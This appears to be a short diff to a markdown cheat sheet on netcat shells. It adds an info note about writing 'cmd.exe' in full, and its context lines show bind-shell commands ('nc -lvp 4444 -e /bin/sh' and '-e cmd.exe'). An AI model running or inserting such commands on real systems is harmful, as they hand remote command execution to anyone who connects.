@@ -41,6 +41,10 @@ nc -lvp 4444 -e /bin/sh
 nc -lvp 4444 -e cmd.exe
 ```
 
+::: note info
+must not `cmd` only
+:::
+
 ## Client
 
 ```bash
